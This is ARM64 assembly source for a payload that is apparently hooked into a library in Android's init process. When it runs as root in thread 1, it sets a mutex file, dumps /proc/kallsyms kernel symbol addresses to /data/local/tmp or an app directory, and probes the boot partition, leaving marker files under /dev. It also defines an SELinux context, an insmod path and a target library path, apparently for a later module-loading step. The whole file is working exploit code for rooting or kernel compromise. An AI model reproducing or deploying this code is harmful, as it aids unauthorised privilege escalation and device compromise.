    .arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

mutex_file:
    .asciz "/dev/df"
kallsyms_path:
    .asciz "/proc/kallsyms"
boot_path:
    .asciz "/dev/block/by-name/boot"
out_tmp:
    .asciz "/data/local/tmp/ks.txt"
out_app:
    .asciz "/data/user_de/0/df.root/ks.txt"
m_k0:
    .asciz "/dev/k0"
m_kx:
    .asciz "/dev/kx"
m_kr:
    .asciz "/dev/kr"
m_kw:
    .asciz "/dev/kw"
m_kb:
    .asciz "/dev/kb"
m_ok:
    .asciz "/dev/ksok"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/insmod"
ko_target:
    .ascii "/vendor/lib64/libbinderdebug.so\0"
    .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data

    .align 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // Detect init tid = 1
    // We need thread 1 to use the default namespace
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    // ── probe + dump /proc/kallsyms (multi-path, tagged failures) ─────
    // open kallsyms
    mov     x0, -100
    adr     x1, kallsyms_path
    mov     x2, xzr
    mov     x8, #SYS_openat
    svc     0
    mov     x19, x0
    tbnz    w19, #31, 6f

    // out1: /data/local/tmp/ks.txt
    mov     x0, -100
    adr     x1, out_tmp
    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
    mov     x3, #0640
    mov     x8, #SYS_openat
    svc     0
    mov     x20, x0
    tbz     w20, #31, 1f

    // out2: /data/user_de/0/df.root/ks.txt
    mov     x0, -100
    adr     x1, out_app
    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
    mov     x3, #0640
    mov     x8, #SYS_openat
    svc     0
    mov     x20, x0
    tbnz    w20, #31, 7f
1:
    sub     sp, sp, #4096
2:
    mov     x0, x19
    mov     x1, sp
    mov     x2, #4096
    mov     x8, #SYS_read
    svc     0
    tbnz    x0, #63, 8f
    cbz     x0, 3f
    mov     x2, x0
    mov     x0, x20
    mov     x1, sp
    mov     x8, #SYS_write
    svc     0
    tbnz    x0, #63, 9f
    b       2b
3:
    add     sp, sp, #4096
    mov     x0, x20
    mov     x8, #SYS_close
    svc     0
    mov     x0, x19
    mov     x8, #SYS_close
    svc     0
    create_mark m_ok
    b       return
6:
    // kallsyms denied: is the boot partition readable instead?
    mov     x0, -100
    adr     x1, boot_path
    mov     x2, xzr
    mov     x8, #SYS_openat
    svc     0
    tbz     w0, #31, 11f
    mov     x21, x0
    create_mark m_kb
    mov     x0, x21
    mov     x8, #SYS_close
    svc     0
    b       return
11:
    create_mark m_k0
    b       return
7:
    create_mark m_kx
    b       return
8:
    add     sp, sp, #4096
    create_mark m_kr
    b       return
9:
    add     sp, sp, #4096
    create_mark m_kw
    b       return


return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
